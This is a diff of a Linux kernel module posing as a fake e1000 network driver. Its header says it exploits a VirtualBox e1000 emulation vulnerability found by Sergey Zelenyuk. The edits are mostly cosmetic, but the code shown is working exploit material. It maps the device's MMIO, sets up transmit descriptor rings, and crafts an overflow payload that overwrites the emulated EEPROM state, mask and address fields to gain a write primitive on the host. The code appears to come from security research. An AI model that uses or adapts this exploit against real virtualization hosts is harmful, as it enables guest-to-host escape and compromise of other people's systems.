@@ -1,4 +1,9 @@
-/* e1k.c – Fake e1000 Driver code */
+/* Fake e1000 Driver code.
+ *
+ * Exploit of an e1000 emulation vulnerability found by Sergey Zelenyuk,
+ * described here https://github.com/MorteNoir1/virtualbox_e1000_0day.
+ * 
+ */
 
 #include <linux/module.h>
 #include <linux/version.h>
@@ -16,8 +21,7 @@ MODULE_LICENSE("TLS-SEC");
 
 #define NB_MAX_DESC 256
 
-/*   ----------------- METHOD DECLARATION -----------------   */
-
+/* ========================== METHOD DECLARATION ========================== */
 static int __init e1k_init(void);
 static void __exit e1k_exit(void);
 static uint8_t* map_mmio(void);
@@ -27,15 +31,14 @@ static void write_primitive(uint16_t address, uint16_t value);
 static void dump_reg(char* regname, uint16_t reg);
 static void dump_memory(void* buffer, int size);
 
-/*   ----------------- GLOBAL VARIABLES -----------------   */
-
+/* ==================== GLOBAL VARIABLES DECLARATION ====================== */
 uint8_t* bar0;
 struct e1000_desc* tx_ring;
 uint8_t* tx_buffer;
 
-/*   ---------------------- CORE ----------------------   */
 
-/* Constructor */
+/* ================================== CORE ================================ */
+/* ------------------------------ Constructor ----------------------------- */
 static int __init e1k_init(void)
 {
 	bar0 = map_mmio();
@@ -50,14 +53,19 @@ static int __init e1k_init(void)
 }
 module_init(e1k_init);
 
-/* Destructor */
+/* ------------------------------- Destructor ----------------------------- */
 static void __exit e1k_exit(void)
 {
 	pr_info("Bye Bye");
 }
 module_exit(e1k_exit);
 
-/* Get Virtual Address mapped to Device Physical Address */
+
+/* ---------------------------- Useful functions -------------------------- */
+
+/** map_mmio : get virtual address mapped to device physical address
+ * @return virtual address of 0xF0000000
+ */
 static uint8_t* map_mmio(void)
 {
 	off_t phys_addr = 0xF0000000;
@@ -72,10 +80,10 @@ static uint8_t* map_mmio(void)
 	return virt_addr;
 }
 
-/* Configure Network Device Registers */
+/** e1k_configure : configure network device (e1000) registers */
 static void e1k_configure(void)
 {
-	//-------- Configure general purpose registers --------//
+	// Configure general purpose registers
 	uint32_t ctrl, tctl, tdlen;
 	uint64_t tdba;
 	int i;
@@ -86,7 +94,7 @@ static void e1k_configure(void)
 	ctrl = get_register(CTRL) | CTRL_ASDE | CTRL_SLU;
 	set_register(CTRL, ctrl);
 
-	//-------- Configure TX registers --------//
+	// Configure TX registers 
 	tx_ring = kmalloc(DESC_SIZE * NB_MAX_DESC, GFP_KERNEL);
 	if (!tx_ring) {
 		pr_info("e1k : failed to allocate TX Ring\n");
@@ -108,8 +116,8 @@ static void e1k_configure(void)
 	}
 
 	tdba = (uint64_t)((uintptr_t) virt_to_phys(tx_ring));
-	set_register(TDBAL, (uint32_t) ((tdba & 0xffffffffULL)));
-	pr_info("tdbal = %lx\n", (uint32_t) (tdba & 0xffffffffULL)); // Don't remove or it will crash the VM when loading module ¯\_(ツ)_/¯
+	set_register(TDBAL, (uint32_t) ((tdba & 0xFFFFFFFFULL)));
+	pr_info("tdbal = %lx\n", (uint32_t) (tdba & 0xFFFFFFFFULL)); // Don't remove or it will crash the VM when loading module ¯\_(ツ)_/¯
 	set_register(TDBAH, (uint32_t) (tdba >> 32));
 
 	tdlen = DESC_SIZE * NB_MAX_DESC;
@@ -122,7 +130,9 @@ static void e1k_configure(void)
 	set_register(TCTL, tctl);
 }
 
-/* Erase EEPROM writing address with new value */
+/** address_overflow : erase EEPROM writing address with new one
+ * @param new_addr : the new adress to write in EEPROM
+ */
 static void address_overflow(uint16_t new_addr)
 {
 	static int	idx = 0;
@@ -137,23 +147,25 @@ static void address_overflow(uint16_t new_addr)
 
 	//------------- Payload setup -------------//
 	
-	/* EEProm Struct :
-	 * 		- enum		m_eState			(32bits) -> -9 + -10 + -11 + -12
-	 *		- bool		m_fWriteEnabled		(08bits) -> -8 
-	 * 		- uint8_t 	Alignment1			(08bits) -> -7
-     *		- uint16_t	m_u16Word			(16bits) -> -5 + -6
-     *		- uint16_t	m_u16Mask			(16bits) -> -3 + -4
-     *		- uint16_t	m_u16Addr			(16bits) -> -1 + -2
+	/* We will overflow on EEProm Struct. Looks like 
+	 *		...
+	 * 		- enum		m_eState			(32 bits)
+	 *		- bool		m_fWriteEnabled		(08 bits)
+	 * 		- uint8_t 	Alignment1			(08 bits)
+     *		- uint16_t	m_u16Word			(16 bits)
+     *		- uint16_t	m_u16Mask			(16 bits)
+     *		- uint16_t	m_u16Addr			(16 bits)
+	 * 		... 
      */
-    tx_buffer[PAYLOAD_LEN-12] = 0x01;
-    tx_buffer[PAYLOAD_LEN-11] = 0x00;
-    tx_buffer[PAYLOAD_LEN-10] = 0x00;
-    tx_buffer[PAYLOAD_LEN-9] = 0x00;
-	tx_buffer[PAYLOAD_LEN-8] = 0x01;
-    tx_buffer[PAYLOAD_LEN-4] = low16((1 << 15));
-    tx_buffer[PAYLOAD_LEN-3] = high16((1 << 15));
-	tx_buffer[PAYLOAD_LEN-2] = low16(new_addr);
-	tx_buffer[PAYLOAD_LEN-1] = high16(new_addr);
+    tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
+    tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
+    tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
+    tx_buffer[PAYLOAD_LEN - 9]	= 0x00;
+	tx_buffer[PAYLOAD_LEN - 8]	= 0x01;
+    tx_buffer[PAYLOAD_LEN - 4]	= low16((1 << 15));
+    tx_buffer[PAYLOAD_LEN - 3]	= high16((1 << 15));
+	tx_buffer[PAYLOAD_LEN - 2]	= low16(new_addr);
+	tx_buffer[PAYLOAD_LEN - 1]	= high16(new_addr);
 	//-----------------------------------------//
 
 	//----------- Descriptors setup -----------//
@@ -175,7 +187,7 @@ static void address_overflow(uint16_t new_addr)
 	context_4->lower_setup.ip_config	=	(uint32_t) 0;
 	context_4->upper_setup.tcp_config	=	(uint32_t) 0;
 	context_4->cmd_and_length			=	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
-	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xf << 16));
+	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xF << 16));
 
 	data_5->buffer_addr					=	(uint64_t) physical_address;
 	data_5->lower.data					=	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
